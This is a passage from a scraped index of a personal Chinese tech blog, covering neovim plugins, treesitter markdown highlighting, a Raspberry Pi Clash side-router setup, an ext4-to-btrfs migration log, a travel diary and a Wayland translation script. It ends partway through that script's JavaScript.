教.而golang和rust就是最棒的编程语言吗?我不知道,在下一个更好的语言出现之前,没有人知道这个问题的答案.\n论体系架构,越来越多的应用也正经历从私有的服务器迁移到云平台的过程,开发者以此能够更加专注于业务代码的开发而将更少的精力浪费在运维上. 但云就是软件架构的终点吗?我也不知道,至少云带来的可信问题和安全问题正在被很多人研究.\n论应用框架,桌面程序的开发框架就有好几种,现在比较流行的Electron框架出来也不过10年,而新的框架也随着rust的兴起如雨后春笋般出现.前端领域中,vue angular react几个框架打得不可开交, 哪怕是久居象牙塔的人工智能领域, 也开始出现rust零星的影子\u0026hellip;几乎每一个领域都在变革,每一个领域都没有统一的最佳框架.\n我几乎笃定,在我们这代人死后,计算机行业依旧不会发展到到像医学和法学那样成熟的地步,所以对于开发者来说,纠结框架,纠结语言实在是大可不必. 我们只活一次,与其把热情押在不一定永恒的符号集合上,不如好好生活,多关心关心身边人.\n","permalink":"https://ch3n9w.github.io/posts/gossip-unstable-software/","summary":"\u003cblockquote\u003e\n\u003cp\u003e乱世之中, 唯有自我与我所爱值得珍惜\u003c/p\u003e\n\u003c/blockquote\u003e","title":"动荡时代"},{"content":" 现在回头看几年前自己写的插件配置文章, 看着那些曾经用过但后来都纷纷被替代的插件, 我会莫名怀念那段因计算机和终端而兴奋不已的自己.\n在 2019 年四月份第一次写 vim 配置文章后, 时间已经过去了四年. 物是人非, 这几年发生了太多的破事烂事, 回想起来, 竟没有几件好事可供玩赏的, 国家的兴盛繁荣和普通人暗淡的生活产生了强烈的对比, 其带来的撕裂感让包括我在内的许多人都感到麻木且疲惫, 每当感到绝望和悲哀时, 我会诉诸文字来排遣情绪, 敲敲代码来为自己的生活带来些许意义, 毕竟, 这是程序员为数不多的特权了.\n而不管是写文也好, 写代码也好, 人若重视, 自然会想得到一个趁手的工具: jetbrain IDE, obsidian, word, trilium, vscode \u0026hellip;\u0026hellip; 对于大部分人来说, 这些便已经足够, 只是如果有人仔细观察, 就会发现这些工具都是商业化的闭源软件, vscode 也是, 即便宣称开源, 但是人们用的二进制包是微软在开源代码的基础上添加了功能后封装闭源的. 不过说到底, 这些软件开源与否, 对我们普通人来说并没有多大的影响, 只是对于有开源软件洁癖的人来说可能会无法接受, 这个时候如果冒出来一个开源, 简单却又拥有无限扩展性和不输给 IDE 的功能的编辑器, 那么无疑能收获一批粉丝, 而 neovim 正是这样的编辑器.\n之前在知乎看到了一个问题: 编辑器中你认为最重要的功能有哪些? 我在这里列出自己认为比较重要的功能, 来作为本文的索引:\n良好的编码体验 人性化的界面 代码调试 模糊查找 其他 与此同时: 文本仅对一些比较有用的插件进行推荐, 并在文末贴出自己的配置链接, 在这里不对自己的配置过多的介绍 (因为确实结构比较简单, 大伙一看就会明白的 :) .\n良好的编码体验 功能 插件 语法高亮 nvim-treesitter/nvim-treesitter 代码补全 hrsh7th/nvim-cmp 代码片段 L3MON4D3/LuaSnip 其他linter, formatter等 nvimtools/none-ls.nvim AI(Copilot)集成 zbirenbaum/copilot.lua git 状态显示 lewis6991/gitsigns.nvim 自动生成文档 danymat/neogen 光标跳转 folke/flash.nvim lsp 增强体验 glepnir/lspsaga.nvim 高亮当前词 RRethy/vim-illuminate 代码结构展示 nvim-neo-tree/neo-tree.nvim 特色缩进 lukas-reineke/indent-blankline.nvim 特色注释 folke/todo-comments.nvim 快速注释 numToStr/Comment.nvim tab 跳出括号和字符串 abecodes/tabout.nvim 代码折叠 kevinhwang91/nvim-ufo lsp/format/dap 源管理 williamboman/mason.nvim 括号操作 kylechui/nvim-surround 自动补全括号中括号等 windwp/nvim-autopairs 部分功能截图:\n人性化的界面 功能 插件 主题 folke/tokyonight.nvim 引导界面 glepnir/dashboard-nvim 文件树 nvim-neo-tree/neo-tree.nvim 标签栏 akinsho/bufferline.nvim 状态栏 hoob3rt/lualine.nvim 截图:\n代码调试 功能 插件 调试功能 mfussenegger/nvim-dap 展示 ui rcarriga/nvim-dap-ui inline 变量显示 theHamsta/nvim-dap-virtual-text 模糊查找 功能 插件 模糊查找 nvim-telescope/telescope.nvim fzf集成 nvim-telescope/telescope-fzf-native.nvim 截图: 其他 功能 插件 Tmux适配 christoomey/vim-tmux-navigator 删除buffer的同时不破坏窗口布局 famiu/bufdelete.nvim 远程剪切板同步 ojroques/nvim-osc52 session 恢复 tpope/vim-obsession 最后贴上配置文件地址, 感兴趣可以去看看: link\n","permalink":"https://ch3n9w.github.io/posts/tech-neovim2023/","summary":"\u003cblockquote\u003e\n\u003cp\u003e现在回头看几年前自己写的插件配置文章, 看着那些曾经用过但后来都纷纷被替代的插件, 我会莫名怀念那段因计算机和终端而兴奋不已的自己.\u003c/p\u003e\n\u003c/blockquote\u003e","title":"我的neovim"},{"content":"难得黄小姐来一次北京, 作为肥宅的自己紧急规划了一下游玩路线, 发现北京可玩的地方相当的多, 这里仅仅记录这次游玩所经过的三个景区.\n天安门 一大早起来从学校出发, 与黄小姐会合之后坐着地铁来到了天安门广场. 现场人很多, 黄小姐指挥我给她拍照, 并现场进行拍照教学, 只可惜我委实不是这块料. 隔着一条街看天安门, 发现那红墙远没有自己想象中来得艳丽, 而是略有些暗沉. 我对天安门没有什么兴趣, 但是看到人民英雄纪念碑时会忍不住过去看看, 因为我知道政治会骗人, 但英雄的牺牲不会.\n拜访完天安门, 本想坐个公交去景山公园, 但是很明显, 身边人山人海的游客们也是这么想的. 公交车还没到, 大爷大妈们就扒起了车门, 车门一开, 他们就像是战场上的勇士一般拼命往上挤, 无论前门还是后门, 丝毫没有考虑到车上的人都下不来了. 我很久没有见识过这样的场面, 听着车上孩子的哭闹, 想到这里是天安门前, 更觉魔幻. 我们也放弃了公交车, 步行前往景山公园.\n景山公园 一路上步行了许久, 等到达公园的时候我也有些累了. 迎面看到有些游客聚在一处石碑面前, 我凑上去看, 当即发现这里原来是崇祯皇帝自杀的地方, 那是当年在明朝那些事里面看到的人物, 到今天印象也颇为深刻. 这样的意外发现让自己在游览景物时不自觉的带上了历史的滤镜, 每当看到一块石雕的时候, 心里就会在想, 这块石头当年是不是崇祯自杀的见证者之一呢?\n当然, 免不了的还有黄小姐的例行照相, 我们爬上山, 在山顶以俯瞰视角拍到了故宫, 然后累如死狗一般慢慢下山.\n北京动物园 人生第一次来动物园, 见识了很多之前只在电视上看到过的动物, 也感慨于人类对于这些生灵的态度仅仅只是欣赏玩物罢了. 和穿汉服的黄小姐在河边拍了一会照片后, 又逛了几个馆, 就回去吃烧烤了.\n","permalink":"https://ch3n9w.github.io/posts/gossip-beijing-travel-2023/","summary":"\u003cp\u003e难得黄小姐来一次北京, 作为肥宅的自己紧急规划了一下游玩路线, 发现北京可玩的地方相当的多, 这里仅仅记录这次游玩所经过的三个景区.\u003c/p\u003e","title":"2023 小游京城"},{"content":" eye candy也是一种生产力!\n动机 treesitter为neovim带来了语法高亮, 让不同语言都被解析成统一的语法树, 并对语法树上的不同部分进行样式的定义. 然而, neovim treesitter对markdown的默认解析方式和高亮模式过于简陋, 不同层级的标题采用的是统一的样式, 列表也仅有开头采用了高亮. 这对于日常使用neovim来编辑markdown的人十分不友好, 于是我花了一点时间了解了一下treesitter的高亮过程, 并最终形成了自定制的漂亮样式.\n这是原来的\n这是自定义后的\n步骤 复制neovim treesitter插件自带的markdown highlight.scm 文件, 由于我使用的插件管理器是lazy, 因此该文件位于~/.local/share/nvim/lazy/nvim-treesitter/queries/markdown/highlights.scm 进入你的配置文件目录 ~/.config/nvim, 创建 ~/.config/nvim/queries/markdown/highlights.scm , 没有目录就创建一下, 将第一步复制的文件内容复制到这里来\n对~/.config/nvim/queries/markdown/highlights.scm 进行自定义修改, 在这里贴出我的\n;From MDeiml/tree-sitter-markdown ; (atx_heading (inline) @text.title) ; (setext_heading (paragraph) @text.title) ; [ ; (atx_h1_marker) ; (atx_h2_marker) ; (atx_h3_marker) ; (atx_h4_marker) ; (atx_h5_marker) ; (atx_h6_marker) ; (setext_h1_underline) ; (setext_h2_underline) ; ] @punctuation.special [ (atx_heading (atx_h1_marker)) ] @text.title1 [ (atx_heading (atx_h2_marker)) ] @text.title2 [ (atx_heading (atx_h3_marker)) ] @text.title3 [ (atx_heading (atx_h4_marker)) ] @text.title4 [ (atx_heading (atx_h5_marker)) ] @text.title5 [ (atx_heading (atx_h6_marker)) ] @text.title6 [ (link_title) (indented_code_block) (fenced_code_block) ] @text.literal (pipe_table_header (pipe_table_cell) @text.title) (pipe_table_header \u0026#34;|\u0026#34; @punctuation.special) (pipe_table_row \u0026#34;|\u0026#34; @punctuation.special) (pipe_table_delimiter_row \u0026#34;|\u0026#34; @punctuation.special) (pipe_table_delimiter_cell) @punctuation.special [ (fenced_code_block_delimiter) ] @punctuation.delimiter (code_fence_content) @none [ (link_destination) ] @text.uri [ (link_label) ] @text.reference [ (thematic_break) (list (list_item (list_marker_minus) (paragraph (inline)))) (list (list_item (list_marker_plus) (paragraph (inline)))) (list (list_item (list_marker_star) (paragraph (inline)))) (list (list_item (list_marker_dot) (paragraph (inline)))) (list (list_item (list_marker_parenthesis) (paragraph (inline)))) ] @punctuation.special2 (task_list_marker_unchecked) @text.todo.unchecked (task_list_marker_checked) @text.todo.checked (block_quote) @text.quote [ (block_continuation) (block_quote_marker) ] @punctuation.special [ (backslash_escape) ] @string.escape ([ (info_string) (fenced_code_block_delimiter) ] @conceal (#set! conceal \u0026#34;\u0026#34;)) (inline) @spell 前往~/.config/nvim/ftplugin/markdown.lua文件, 为新增加的节点定义高亮样式, 我的该文件内容如下, 读者可以自行修改颜色\nvim.opt_local.expandtab = true vim.opt_local.shiftwidth = 4 vim.opt_local.tabstop = 4 vim.opt_local.softtabstop = 4 vim.opt_local.foldmethod = \u0026#34;expr\u0026#34; vim.opt_local.foldexpr = \u0026#34;nvim_treesitter#foldexpr()\u0026#34; vim.api.nvim_set_hl(0, \u0026#34;@text.title1\u0026#34;, {fg=\u0026#34;#7aa2f7\u0026#34;, bold=true, italic=true}) vim.api.nvim_set_hl(0, \u0026#34;@text.title2\u0026#34;, {fg=\u0026#34;#ff9e64\u0026#34;, bold=true, italic=true}) vim.api.nvim_set_hl(0, \u0026#34;@text.title3\u0026#34;, {fg=\u0026#34;#9ece6a\u0026#34;, bold=true, italic=true}) vim.api.nvim_set_hl(0, \u0026#34;@text.title4\u0026#34;, {fg=\u0026#34;#7dcfff\u0026#34;, bold=true, italic=true}) vim.api.nvim_set_hl(0, \u0026#34;@text.title5\u0026#34;, {fg=\u0026#34;#bb9af7\u0026#34;, bold=true, italic=true}) vim.api.nvim_set_hl(0, \u0026#34;@text.title6\u0026#34;, {fg=\u0026#34;#cfc9c2\u0026#34;, bold=true, italic=true}) vim.api.nvim_set_hl(0, \u0026#34;@text.quote\u0026#34;, {fg=\u0026#34;#bb9af7\u0026#34;, bold=false, italic=true}) vim.api.nvim_set_hl(0, \u0026#34;@punctuation.special2\u0026#34;, {fg=\u0026#34;#73daca\u0026#34;, bold=true, italic=false}) End\n","permalink":"https://ch3n9w.github.io/posts/tech-neovim-treesitter-markdown/","summary":"\u003cblockquote\u003e\n\u003cp\u003eeye candy也是一种生产力!\u003c/p\u003e\n\u003c/blockquote\u003e","title":"优化neovim markdown中的treesitter高亮"},{"content":" “一个黑暗的形体，像一个匍匐的人一般大小，但是长着长长的蜘蛛一样的肢体……黑暗中的形体以惊人的速度向他奔来。当它靠近时，他看到那蹲坐着的乌黑身体上有一张脸，在身体底部那些多节的腿之间。那张面孔用一种怀疑和质问的可憎表情凝视着他；而当这个大胆的猎人与那小而狡诈的，四周全是毛发的眼睛对视时，恐惧流遍了他的每一根血管。”\n自从我在自己的红米ac2100上跑shellclash之后, 路由器的表现就开始变得不再稳定, 且不说shellclash 的些许适配上的小问题, clash自身所消耗的内存, 也让我这台只有128M内存的路由器不堪重负.\n一开始, 我想换个性能更好的路由器比如AX6000这样的路由器, 一看价格也不是特别贵, 就想着入手, 但是向来崇尚极简主义的自己不免会想到怎么处理手头现有的路由器, 难道要扔掉吗? 我一边这样想着, 一边查看AX6000的参数, 希望能看到足够吸引我购买的数值, 但是512M的内存容量属实让我笑出了声: 这算什么, 我手头的树莓派3b+都能吊打它.\n想到这里, 心念一动, 对啊, 如果可以以某种方式让树莓派和路由器协作起来, 让clash跑在树莓派上, 既能解决我的问题, 又可以让吃灰已久的树莓派再就业, 岂不美哉? 如此想着, 就找到了 https://zhuanlan.zhihu.com/p/270351562?utm_id=0 ,\n第一步 刷入openwrt 当然, 要达到这样的效果, 第一步是让我的路由器刷入openwrt, 幸运的是, openwrt官方支持红米ac2100并且在官网给出了安装教程, 链接为https://openwrt.org/toh/xiaomi/xiaomi_redmi_router_ac2100, 然后可以按照个人喜好调整网段, 由于我的局域网中有一个k8s集群, 我不希望集群节点的ip变化, 因此我将默认的192.168.1.0/24 设置成了 192.168.31.0/24\n第二步 树莓派设置 静态ip 编辑 /etc/dhcpcd.conf, 添加静态ip\ninterface eth0 static ip_address=192.168.31.55/24 static routers=192.168.31.1 static domain_name_servers=192.168.31.1 8.8.8.8 fd51:42f8:caae:d92e::1 设置iptables转发规则 将所有流量转发给clash\niptables -t nat -N CLASH iptables -t nat -A CLASH -d 10.0.0.0/8 -j RETURN iptables -t nat -A CLASH -d 127.0.0.0/8 -j RETURN iptables -t nat -A CLASH -d 169.254.0.0/16 -j RETURN iptables -t nat -A CLASH -d 172.16.0.0/12 -j RETURN iptables -t nat -A CLASH -d 192.168.0.0/16 -j RETURN iptables -t nat -A CLASH -d 224.0.0.0/4 -j RETURN iptables -t nat -A CLASH -d 240.0.0.0/4 -j RETURN iptables -t nat -A CLASH -p tcp -j REDIRECT --to-ports 7892 iptables -t nat -A PREROUTING -p tcp -j CLASH clash安装配置 示例:\nport: 7890 socks-port: 7891 redir-port: 7892 allow-lan: true mode: Rule log-level: debug external-controller: :9090 proxies: ...... rules: ...... dns: use-hosts: true listen: 0.0.0.0:53 #listen: 127.0.0.1:7874 enable: true ipv6: false enhanced-mode: fake-ip nameserver: - 114.114.114.114 - 119.29.29.29 fallback: - https://cloudflare-dns.com/dns-query - https://dns.google/dns-query - https://1.1.1.1/dns-query - tls://8.8.8.8:853 fallback-filter: geoip: true ipcidr: - 0.0.0.0/8 - 10.0.0.0/8 - 100.64.0.0/10 - 127.0.0.0/8 - 169.254.0.0/16 - 172.16.0.0/12 - 192.0.0.0/24 - 192.0.2.0/24 - 192.88.99.0/24 - 192.168.0.0/16 - 198.18.0.0/15 - 198.51.100.0/24 - 203.0.113.0/24 - 224.0.0.0/4 - 240.0.0.0/4 - 255.255.255.255/32 下载3b+对应架构的clash , 也就是armv7, 启动一下, 到这里我们还不能让局域网设备走树莓派的clash\n第三步 设置路由器的网关和dns 如图, 在lan中添加DHCP选项, 将路由器的dns和网关设置为树莓派\n3,\u0026lt;树莓派ip\u0026gt; 6,\u0026lt;树莓派ip\u0026gt; 我的设置\n3,192.168.31.55 6,192.168.31.55 保存, 加载, 重启路由器(好像也不用重启), 你会发现你局域网下的流量会走树莓派的clash了!\n第四步 收尾工作 树莓派开机启动服务 vi /etc/systemd/system/clash.service\n[Unit] Description=Clash Daemon [Service] ExecStart=/root/clash -d /root/.config/clash [Install] WantedBy=multi-user.target iptables常驻化 为了不让iptables规则在重启后丢失, 需要使用开机自启\napt-get install iptables-persistent iptables-save -f /etc/iptables/rules.v4 systemctl enable netfilter-persistent 结束!\n","permalink":"https://ch3n9w.github.io/posts/tech-openwrt-rasp/","summary":"\u003cblockquote\u003e\n\u003cp\u003e“一个黑暗的形体，像一个匍匐的人一般大小，但是长着长长的蜘蛛一样的肢体……黑暗中的形体以惊人的速度向他奔来。当它靠近时，他看到那蹲坐着的乌黑身体上有一张脸，在身体底部那些多节的腿之间。那张面孔用一种怀疑和质问的可憎表情凝视着他；而当这个大胆的猎人与那小而狡诈的，四周全是毛发的眼睛对视时，恐惧流遍了他的每一根血管。”\u003c/p\u003e\n\u003c/blockquote\u003e","title":"树莓派搭载clash作为旁路由"},{"content":"这篇文章是对我从ext4文件系统转换到btrfs过程中的一些操作记录, 便于日后参考.\n前置准备 制作arch linux 启动盘, 版本越新越好. 备份重要文件 我个人在转换前会把大文件(例如虚拟机文件)转移到移动硬盘里, 让转换过程更快一些 转换 进入LiveCD 系统, 对主分区进行转换\nbtrfs-convert /dev/nvme0n1p2 等待一段时间之后, 显示conversion complete就表示没有问题, 接下来还需要做三件事情才可以进入系统\n修改fstab 首先将转换成功后的分区挂载到/mnt下\nmount /dev/nvme0n1p2 /mnt 使用lsblk -f命令查看分区的UUID号, 拍个照片记一下\n编辑/mnt/etc/fstab, 修改这个分区类型为btrfs, 将最后的两列数字都改成0, 保存退出\n重建内存盘 先挂载, 然后进入chroot环境\nmount -t proc none /mnt/proc mount -t sysfs none /mnt/sys mount -o bind /dev /mnt/dev chroot /mnt bash 然后执行下列命令来为所有内核重建内存盘\nmkinitcpio -P 最后重建grub引导, 按照道理应该要把引导分区/dev/nvme0n1p1挂载到/mnt/boot之后才可以, 但是我记得自己执行的时候没有挂载?\ngrub-mkconfig -o /boot/grub/grub.cfg 重建grub引导 在上一步的chroot环境中, 执行下列命令, 记得把引导分区挂载到/mnt/boot\ngrub-mkconfig -o /boot/grub/grub.cfg 大功告成, 退出chroot, 重启电脑就可以进入你的系统了, 唯一的不同是它已经是btrfs了.\n子卷建立 经过上述操作后, 你会得到一个没有子卷的根文件系统, 这点可以通过命令验证\nsudo btrfs subvol list / 没有子卷就没有快照, 为了利用好btrfs的特性, 有必要新建快照, 并将数据迁移到里面. 同样, 我们需要进入 LiveCD 系统\n首先将btrfs分区挂载到/mnt下\nmount -o subvol=/ /dev/nvme0n1p2 /mnt 接下来就要开始新建子卷了, 我新建的子卷有两个, 一个叫做@, 一个叫做@home, 分别挂载根目录和家目录. 这样新建的原因是timeshift在使用btrfs进行备份的时候规定这样的命名.\n那么首先, 使用btrfs的快照功能新建@子卷\nbtrfs subvol snapshot /mnt /mnt/@ 然后建立@home子卷, 再将@子卷中/home的内容迁移过去\nbtrfs subvol create /mnt/@home mv -v /mnt/@/home/* /mnt/@home 好了, 子卷新建完毕, 接下来要让系统在启动的时候挂载子卷\n首先, 挂载btrfs分区到/mnt\n# 这一步在上面如果执行过了就不需要执行了 mount -o subvol=/ /dev/nvme0n1p2 /mnt # 这些需要挂载 mount -o bind /dev /mnt/dev mount -o bind /proc /mnt/proc mount -o bind /sys /mnt/sys mount -o bind /boot /mnt/boot # 进入chroot环境 chroot /mnt 然后新建内存初始盘\nmkinitcpio -P 然后更新fstab, 我的如下, 里面重要的是subvol一项, 其他的参数中, autodefrag是btrfs用于应对碎片化的挂载选项, compress=lzo启动透明压缩\n# /dev/nvme0n1p2 UUID=6dd702be-7727-447e-98ec-a79205f18df7\t/ btrfs defaults,noatime,autodefrag,subvol=@,compress=lzo,\t0 0 UUID=6dd702be-7727-447e-98ec-a79205f18df7\t/home btrfs defaults,noatime,autodefrag,subvol=@home,compress=lzo\t0 0 # /dev/nvme0n1p1 UUID=8D41-41B9 /boot vfat rw,relatime,fmask=0022,dmask=0022,codepage=437,iocharset=ascii,shortname=mixed,utf8,errors=remount-ro\t0 2 最后顺手更新一下grub (似乎没必要?)\ngrub-mkconfig -o /boot/grub/grub.cfg 重启进入系统就可以了. 接下来可以安装timeshift来对系统进行定时备份\n在一切都没有问题后, 就可以重新进入LiveCD环境, 清理掉原来的那些文件了\nmount -o subvol=/ /dev/nvme0n1p2 /mnt cd /mnt rm -r var usr .......(除了子卷外都删掉) 最后剩下这些\n清理完毕, 收工\n其他 去除已有文件的碎片化\nsudo btrfs filesystem defragment -r / 回收分配但未使用的数据, 对节约空间有帮助\nsudo btrfs balance start / sudo btrfs balance status / 参考 https://coda.world/btrfs-move-to-subvolume/\nhttps://blog.samchu.cn/posts/linux-ext4-to-btrfs/\nhttps://www.jwillikers.com/btrfs-mount-options\n","permalink":"https://ch3n9w.github.io/posts/tech-ext4-to-btrfs/","summary":"\u003cp\u003e这篇文章是对我从ext4文件系统转换到btrfs过程中的一些操作记录, 便于日后参考.\u003c/p\u003e\n\u003ch2 id=\"前置准备\"\u003e前置准备\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e制作arch linux 启动盘, 版本越新越好.\u003c/li\u003e\n\u003cli\u003e备份重要文件\u003c/li\u003e\n\u003cli\u003e我个人在转换前会把大文件(例如虚拟机文件)转移到移动硬盘里, 让转换过程更快一些\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2 id=\"转换\"\u003e转换\u003c/h2\u003e\n\u003cp\u003e进入LiveCD 系统, 对主分区进行转换\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ebtrfs-convert /dev/nvme0n1p2\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e等待一段时间之后, 显示\u003ccode\u003econversion complete\u003c/code\u003e就表示没有问题, 接下来还需要做三件事情才可以进入系统\u003c/p\u003e\n\u003ch3 id=\"修改fstab\"\u003e修改fstab\u003c/h3\u003e\n\u003cp\u003e首先将转换成功后的分区挂载到\u003ccode\u003e/mnt\u003c/code\u003e下\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emount /dev/nvme0n1p2 /mnt\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e使用\u003ccode\u003elsblk -f\u003c/code\u003e命令查看分区的UUID号, 拍个照片记一下\u003c/p\u003e\n\u003cp\u003e编辑\u003ccode\u003e/mnt/etc/fstab\u003c/code\u003e, 修改这个分区类型为btrfs, 将最后的两列数字都改成0, 保存退出\u003c/p\u003e\n\u003ch3 id=\"重建内存盘\"\u003e重建内存盘\u003c/h3\u003e\n\u003cp\u003e先挂载, 然后进入chroot环境\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emount -t proc none /mnt/proc\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emount -t sysfs none /mnt/sys\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emount -o bind /dev /mnt/dev\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003echroot /mnt bash\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e然后执行下列命令来为所有内核重建内存盘\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emkinitcpio -P\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e最后重建grub引导, 按照道理应该要把引导分区\u003ccode\u003e/dev/nvme0n1p1\u003c/code\u003e挂载到\u003ccode\u003e/mnt/boot\u003c/code\u003e之后才可以, 但是我记得自己执行的时候没有挂载?\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egrub-mkconfig -o /boot/grub/grub.cfg\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"重建grub引导\"\u003e重建grub引导\u003c/h3\u003e\n\u003cp\u003e在上一步的chroot环境中, 执行下列命令, 记得把引导分区挂载到\u003ccode\u003e/mnt/boot\u003c/code\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egrub-mkconfig -o /boot/grub/grub.cfg\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e大功告成, 退出chroot, 重启电脑就可以进入你的系统了, 唯一的不同是它已经是btrfs了.\u003c/p\u003e","title":"ext4到btrfs转换记录"},{"content":"对于我这种英语不好的人来说, 翻译是离不开的工具, 但是众所周知, Linux的日用软件生态相比较windows和macos来说相差甚远, 别说目前正处于发展阶段的wayland, 就连成熟透了的x11下也没有拿得出手的翻译软件. 作为一个英语不好的Linux爱好者, 缺少翻译软件必定会对日常的使用造成一定的影响, 于是开始思考怎么样解决这个问题.\n我的第一个思路, 也就是见到最多的划词翻译软件的样子, 选中文本之后, 在被选中的文本周围的某块区域中绘制一个窗口, 在其中展示翻译结果. 但是问题来了, 要如何绘制这样的窗口呢? 在wayland中, 窗口的位置交给了compositor进行管理, 这种能够自己决定显示位置的能力, 据我所知, 在wayland下仅有fcitx5做到了, 于是我翻阅了一下它的源代码, 并没有看懂, 但是应该没有借助于Qt和GTK来绘制, 而是使用wayland-client. 对我这样一个连Qt GTK开发经历都没有的人来说, 理解wayland编程开发中的那些概念实在有些困难. 于是紧接着又有一个问题出现了:\n能否绕开wayland?\n就我思考这个问题的时候, linux QQ给我发了一个系统通知, 我的电脑上的系统通知服务原先只是为了让linux qq不崩溃才安装的, 然而这个时候, 它给了我一个新的解决方案: 使用系统通知来呈现翻译结果. 于是搜了一下如何发送系统通知, 发现竟然意外的简单.\nnotify-send \u0026#34;title\u0026#34; \u0026#34;content\u0026#34; 那么接下来的问题: 如何获取选中文本的内容? 这个问题, 我原本计划通过阅读wl-clipboard来学习的, 但是我想先尽快用上翻译, 把优化放到以后再说, 于是决定直接使用wl-clipboard来获取选中文本内容, 那么至此思路理清, 大致如下:\n使用剪切板获取到选中文本的内容, 可以使用wl-paste -p来获取 获取文本之后, 将换行符替换成空格 (这块可以有更好的处理方法, 简单起见就全换掉了), 使用sed 文本处理完毕后, 将文本输入进translate.js中进行翻译, (这块可以使用别的现成工具) 翻译结果出来之后, 将结果以系统通知的形式呈现出来, 当然, 系统通知必须要有, 可以是dunst, mako, swaync, 以及kde或者gnome的桌面消息通知都可以. 发送翻译结果使用命令notify-send \u0026quot;标题\u0026quot; \u0026quot;翻译内容\u0026quot; 以我的划词翻译为案例, 我在~/.config/sway/config中加入了这么一行作为划词翻译触发按键\nbindsym Ctrl+Mod1+z exec ~/.config/sway/bin/translate.sh 那么来看看translate.sh的内容是怎么样的:\na=$(wl-paste -p | sed \u0026#39;:a;N;$!ba;s/\\n/ /g\u0026#39; | node ~/.config/sway/bin/translate.js) notify-send \u0026#34;Google\u0026#34; \u0026#34;$a\u0026#34; 首先从primary剪切板中获取选中的文本内容, 注意这个剪切板不需要你按ctrl-c, 选中文本的时候, 文本会自动出现在primary剪切板中. 然后使用sed命令将\\n都替换为空格. 再然后执行js脚本, 将要翻译的内容通过管道符输入进去, js脚本调用谷歌翻译. 最后出来的翻译结果通过notify-send发送出去了.\ntranslate.js文件的内容如下\nfunction TL(a) { var k = \u0026#34;\u0026#34;; var b = 406644; var b1 = 3293161072; var jd = \u0026#34;.\u0026#34;; var $b = \u0026#34;+-a^+6\u0026#34;; var Zb = \u0026#34;+-3^+b+-f\u0026#34;; for (var e = [], f = 0, g = 0; g \u0026lt; a.length; g++) { var m = a.charCodeAt(g); 128 \u0026gt; m ? (e[f++] = m) : (2048 \u0026gt; m ? (e[f++] = (m \u0026gt;\u0026gt; 6) | 192) : (55296 === (m \u0026amp; 64512) \u0026amp;\u0026amp; g + 1 \u0026lt; a.length \u0026amp;\u0026amp; 56320 === (a.charCodeAt(g + 1) \u0026amp; 64512) ? ((m = 65536 + ((m \u0026amp; 1023) \u0026lt;\u0026lt; 10) + (a.charCodeAt(++g) \u0026amp; 1023)), (e[f++] = (m \u0026gt;\u0026gt; 18) | 240), (e[f++] = ((m \u0026gt;\u0026gt; 12) \u0026amp; 63) | 128)) : (e[f++] = (m \u0026gt;\u0026gt; 12) | 224), (e[f++] = ((m \u0026gt;\u0026gt; 6) \u0026amp; 63) | 128)), (e[f++] = (m \u0026amp; 63) | 128)); } a = b; for (f = 0; f \u0026lt; e.length; f++) (a += e[f]), (a = RL(a, $b)); a = RL(a, Zb); a ^= b1 || 0; 0 \u0026gt; a \u0026amp;\u0026amp; (a = (a \u0026amp; 2147483647) + 2147483648); a %= 1e6; return a.toString() + jd + (a ^ b); } function RL(a, b) { var t = \u0026#34;a\u0026#34;; var Yb = \u0026#34;+\u0026#34;; for (var c = 0; c \u0026lt; b.length - 2; c += 3) { var d = b.charAt(c + 2); d = d \u0026gt;= t ? d.charCodeAt(0) - 87 : Number(d); d = b.charAt(c + 1) === Yb ? a 